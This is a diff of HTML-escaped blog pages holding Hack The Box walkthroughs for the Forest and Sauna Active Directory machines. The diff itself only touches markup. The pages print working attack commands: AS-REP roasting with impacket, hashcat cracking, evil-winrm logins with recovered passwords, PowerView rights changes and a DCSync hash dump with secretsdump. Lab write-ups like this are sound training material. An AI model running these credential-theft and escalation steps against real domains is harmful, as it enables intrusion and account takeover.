 Increasing send delay for 10.129.36.185 from 320 to 640 due to 89 out of 295 dropped probes since last increase.
 Warning: 10.129.36.185 giving up on port because retransmission cap hit (10).
 Nmap scan report for htb.local (10.129.36.185)
@@ -494,7 +448,7 @@ PORT      STATE SERVICE      VERSION
 49925/tcp open  msrpc        Microsoft Windows RPC
 Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows
 
-...&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
+...&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
   &lt;button
     class=&#34;hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50&#34;
     title=&#34;Copy code&#34;
@@ -503,8 +457,6 @@ Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows
     &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
   &lt;/button&gt;
 &lt;/div&gt;
-
-  
 &lt;/div&gt;
 &lt;p&gt;None of these seemed like an obvious remote access service to me, so I&amp;rsquo;ve decided to take a look at the hint, which said that it would be interesting to check if WinRM was open.&lt;/p&gt;
 &lt;p&gt;After googling &amp;ldquo;winrm&amp;rdquo;, I noticed that it used &lt;code&gt;5985&lt;/code&gt; as it&amp;rsquo;s default port, which we found open in the nmap scan.&lt;/p&gt;
@@ -512,7 +464,6 @@ Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows
 &lt;p&gt;I&amp;rsquo;ve found a couple of solutions to connect to the machine at this point. The most simple seemed to be using straight PowerShell, which comes pre-installed on Kali as pwsh,  and then connecting to the remote machine using the &lt;code&gt;Enter-PSSession&lt;/code&gt; command. That didn&amp;rsquo;t work, so used Evil-WinRM instead.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;image-4.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
 &lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
-  
 
 &lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;PS C:\Users\svc-alfresco\Documents&amp;gt; ls C:\Users&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
   &lt;button
@@ -523,13 +474,10 @@ Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows
     &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
   &lt;/button&gt;
 &lt;/div&gt;
-
-  
 &lt;/div&gt;
 &lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
-  
 
-&lt;pre&gt;&lt;code&gt;    Directory: C:\Users
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;    Directory: C:\Users
 
 
 Mode                LastWriteTime         Length Name
@@ -537,7 +485,7 @@ Mode                LastWriteTime         Length Name
 d-----        9/18/2019  10:09 AM                Administrator
 d-r---       11/20/2016   6:39 PM                Public
 d-----        9/22/2019   3:29 PM                sebastien
-d-----        9/22/2019   4:02 PM                svc-alfresco&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
+d-----        9/22/2019   4:02 PM                svc-alfresco&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
   &lt;button
     class=&#34;hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50&#34;
     title=&#34;Copy code&#34;
@@ -546,8 +494,6 @@ d-----        9/22/2019   4:02 PM                svc-alfresco&lt;/code&gt;&lt;/p
     &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
   &lt;/button&gt;
 &lt;/div&gt;
-
-  
 &lt;/div&gt;
 &lt;h2&gt;Root&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;root&#34;&gt;&lt;/span&gt;
     &lt;a href=&#34;#root&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;h3&gt;Q6: Which group has WriteDACL permissions over the HTB.LOCAL domain? Give the group name without the @htb.local.&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;q6-which-group-has-writedacl-permissions-over-the-htblocal-domain-give-the-group-name-without-the-htblocal&#34;&gt;&lt;/span&gt;
@@ -571,7 +517,6 @@ d-----        9/22/2019   4:02 PM                svc-alfresco&lt;/code&gt;&lt;/p
 &lt;p&gt;&lt;img src=&#34;image-8.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;Then, I added my user to the &amp;ldquo;Remote Management Users&amp;rdquo; group, in order to be able to access it with &lt;code&gt;evil-winrm&lt;/code&gt;.&lt;/p&gt;
 &lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
-  
 
 &lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;PS C:\Users\svc-alfresco\Documents&amp;gt; Add-DomainGroupMember -Identity &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Remote Management Users&amp;#34;&lt;/span&gt; -Members zetsu&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
   &lt;button
@@ -582,12 +527,9 @@ d-----        9/22/2019   4:02 PM                svc-alfresco&lt;/code&gt;&lt;/p
     &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
   &lt;/button&gt;
 &lt;/div&gt;
-
-  
 &lt;/div&gt;
 &lt;p&gt;Finally, added the account to the target group.&lt;/p&gt;
 &lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
-  
 
 &lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;PS C:\Users\svc-alfresco\Documents&amp;gt; Add-DomainGroupMember -Identity &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Exchange Windows Permissions&amp;#34;&lt;/span&gt; -Members zetsu&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
   &lt;button
@@ -598,8 +540,6 @@ d-----        9/22/2019   4:02 PM                svc-alfresco&lt;/code&gt;&lt;/p
     &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
   &lt;/button&gt;
 &lt;/div&gt;
-
-  
 &lt;/div&gt;
 &lt;p&gt;Now we can connect to our user in a new WinRM session.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;image-9.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
@@ -610,7 +550,6 @@ d-----        9/22/2019   4:02 PM                svc-alfresco&lt;/code&gt;&lt;/p
 &lt;p&gt;From the &lt;a href=&#34;https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;HackTricks page&lt;/a&gt;: &amp;ldquo;The DCSync attack simulates the behavior of a Domain Controller and asks other Domain Controllers to replicate information using the Directory Replication Service Remote Protocol (MS-DRSR). Because MS-DRSR is a valid and necessary function of Active Directory, it cannot be turned off or disabled.&amp;rdquo;&lt;/p&gt;
 &lt;p&gt;What the WriteDACL permission allows us to do here is granting ourselves the permissions over the domain that are necessary to perform a DCSync attack. We can do so with PowerView.&lt;/p&gt;
 &lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
-  
 
 &lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;PS C:\Users\zetsu\Documents&amp;gt; $SecPassword = ConvertTo-SecureString &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;chinforinfola&amp;#39;&lt;/span&gt; -AsPlainText -Force
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;PS C:\Users\zetsu\Documents&amp;gt; $Cred = New-Object System.Management.Automation.PSCredential(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;HTB\zetsu&amp;#39;&lt;/span&gt;, $SecPassword)
@@ -623,12 +562,9 @@ d-----        9/22/2019   4:02 PM                svc-alfresco&lt;/code&gt;&lt;/p
     &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
   &lt;/button&gt;
 &lt;/div&gt;
-
-  
 &lt;/div&gt;
 &lt;p&gt;Now, we can use &lt;code&gt;secretsdump.py&lt;/code&gt; to perform the actual attack.&lt;/p&gt;
 &lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
-  
 
 &lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ secretsdump.py -just-dc &amp;lt;username&amp;gt;:&amp;lt;password&amp;gt;@&amp;lt;target-ip&amp;gt; -outputfile &amp;lt;filename&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
   &lt;button
@@ -639,8 +575,6 @@ d-----        9/22/2019   4:02 PM                svc-alfresco&lt;/code&gt;&lt;/p
     &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
   &lt;/button&gt;
 &lt;/div&gt;
-
-  
 &lt;/div&gt;
 &lt;p&gt;&lt;img src=&#34;image-11.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;Getting Administrator NT hash. Check &lt;a href=&#34;https://en.wikipedia.org/wiki/NTLM&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;this WikiPedia article&lt;/a&gt; for reference on the hash format.&lt;/p&gt;
@@ -674,7 +608,6 @@ d-----        9/22/2019   4:02 PM                svc-alfresco&lt;/code&gt;&lt;/p
     &lt;a href=&#34;#footholduser&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;h3&gt;Q1: What is the name of the HTML file that reveals the names of users working at the target company?&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;q1-what-is-the-name-of-the-html-file-that-reveals-the-names-of-users-working-at-the-target-company&#34;&gt;&lt;/span&gt;
     &lt;a href=&#34;#q1-what-is-the-name-of-the-html-file-that-reveals-the-names-of-users-working-at-the-target-company&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Starting with nmap, scanning all TCP ports right away, just to avoid having to run it twice, as I did in &lt;a href=&#34;../forest/&#34; &gt;Forest&lt;/a&gt;.&lt;/p&gt;
 &lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
-  
 
 &lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ nmap -sCV -p- --min-rate&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1000&lt;/span&gt; -oN nmap/complete.nmap 10.129.95.180&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
   &lt;button
@@ -685,13 +618,10 @@ d-----        9/22/2019   4:02 PM                svc-alfresco&lt;/code&gt;&lt;/p
     &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
   &lt;/button&gt;
 &lt;/div&gt;
-
-  
 &lt;/div&gt;
 &lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
-  
 
-&lt;pre&gt;&lt;code&gt;# Nmap 7.94SVN scan initiated Wed Jul 31 21:46:55 2024 as: nmap -sCV -p- --min-rate=1000 -oN nmap/complete.nmap 10.129.95.180
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;# Nmap 7.94SVN scan initiated Wed Jul 31 21:46:55 2024 as: nmap -sCV -p- --min-rate=1000 -oN nmap/complete.nmap 10.129.95.180
 Nmap scan report for 10.129.95.180
 Host is up (0.17s latency).
 Not shown: 65516 filtered tcp ports (no-response)
@@ -733,7 +663,7 @@ Host script results:
 |_  start_date: N/A
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-# Nmap done at Wed Jul 31 21:50:49 2024 -- 1 IP address (1 host up) scanned in 233.60 seconds&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
+# Nmap done at Wed Jul 31 21:50:49 2024 -- 1 IP address (1 host up) scanned in 233.60 seconds&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
   &lt;button
     class=&#34;hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50&#34;
     title=&#34;Copy code&#34;
@@ -742,8 +672,6 @@ Service detection performed. Please report any incorrect results at https://nmap
     &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
   &lt;/button&gt;
 &lt;/div&gt;
-
-  
 &lt;/div&gt;
 &lt;p&gt;We see that there&amp;rsquo;s an IIS HTTP server on Port 80. Let&amp;rsquo;s take a look at it.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;image-1.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
@@ -756,9 +684,8 @@ Service detection performed. Please report any incorrect results at https://nmap
 &lt;p&gt;&lt;a href=&#34;https://github.com/captain-noob/username-wordlist-generator&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://github.com/captain-noob/username-wordlist-generator&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;Here&amp;rsquo;s the resulting list:&lt;/p&gt;
 &lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
-  
 
-&lt;pre&gt;&lt;code&gt;Fergus-Smith
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;Fergus-Smith
 Fergus_Smith
 Fergus.Smith
 Fergus Smith
@@ -841,7 +768,7 @@ S.Kerb
 Steven-K
 Steven_K
 Steven.K
-SK&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
+SK&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
   &lt;button
     class=&#34;hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50&#34;
     title=&#34;Copy code&#34;
@@ -850,12 +777,9 @@ SK&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-
     &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
   &lt;/button&gt;
 &lt;/div&gt;
-
-  
 &lt;/div&gt;
 &lt;p&gt;Now, running the &lt;code&gt;GetNPUsers&lt;/code&gt; script:&lt;/p&gt;
 &lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
-  
 
 &lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ impacket-GetNPUsers egotistical-bank.local/ -outputfile npusers.txt -format hashcat -usersfile userlist.txt -dc-ip &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;10.129.95.180&amp;#34;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
   &lt;button
@@ -866,8 +790,6 @@ SK&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-
     &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
   &lt;/button&gt;
 &lt;/div&gt;
-
-  
 &lt;/div&gt;
 &lt;p&gt;&lt;img src=&#34;image-3.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;R2: FSmith&lt;/strong&gt;&lt;/p&gt;
@@ -876,7 +798,6 @@ SK&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-
 &lt;h3&gt;Q4: What is the password of the user fsmith?&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;q4-what-is-the-password-of-the-user-fsmith&#34;&gt;&lt;/span&gt;
     &lt;a href=&#34;#q4-what-is-the-password-of-the-user-fsmith&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Now we can attempt cracking that hash. I did it with hashcat.&lt;/p&gt;
 &lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
-  
 
 &lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ hashcat -a &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; npusers.txt /usr/share/wordlists/rockyou.txt&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
   &lt;button
@@ -887,8 +808,6 @@ SK&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-
     &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
   &lt;/button&gt;
 &lt;/div&gt;
-
-  
 &lt;/div&gt;
 &lt;p&gt;&lt;img src=&#34;image-4.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;R4: Thestrokes23&lt;/strong&gt;&lt;/p&gt;
@@ -896,7 +815,6 @@ SK&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-
     &lt;a href=&#34;#q5-now-that-you-have-a-valid-set-of-credentials-on-what-port-can-you-connect-to-the-machine-and-get-an-interactive-shell&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;As we saw on the nmap output, port &lt;code&gt;5985&lt;/code&gt; is open, which is the default port for WinRM, we learned in Forest that it is a protocol for remote access on windows.&lt;/p&gt;
 &lt;p&gt;This way, we can connect to the machine using evil-winrm, which besides giving the shell, also contains other stuff that are useful to pwn Windows.&lt;/p&gt;
 &lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
-  
 
 &lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ evil-winrm -i &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;10.129.95.180&amp;#34;&lt;/span&gt; -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fsmith&amp;#34;&lt;/span&gt; -p &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Thestrokes23&amp;#34;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
   &lt;button
@@ -907,8 +825,6 @@ SK&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-
     &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
   &lt;/button&gt;
 &lt;/div&gt;
-
-  
 &lt;/div&gt;
 &lt;p&gt;&lt;img src=&#34;image-5.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;R5: 5985&lt;/strong&gt;&lt;/p&gt;
@@ -916,7 +832,6 @@ SK&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-
     &lt;a href=&#34;#privilege-escalation&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;h3&gt;Q6: What user is configured to autologin?&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;q6-what-user-is-configured-to-autologin&#34;&gt;&lt;/span&gt;
     &lt;a href=&#34;#q6-what-user-is-configured-to-autologin&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Trying to get user information:&lt;/p&gt;
 &lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
-  
 
 &lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;PS C:\Users\FSmith\Documents&amp;gt; get-localuser&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
   &lt;button
@@ -927,8 +842,6 @@ SK&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-
     &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
   &lt;/button&gt;
 &lt;/div&gt;
-
-  
 &lt;/div&gt;
 &lt;p&gt;&lt;img src=&#34;image-6.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
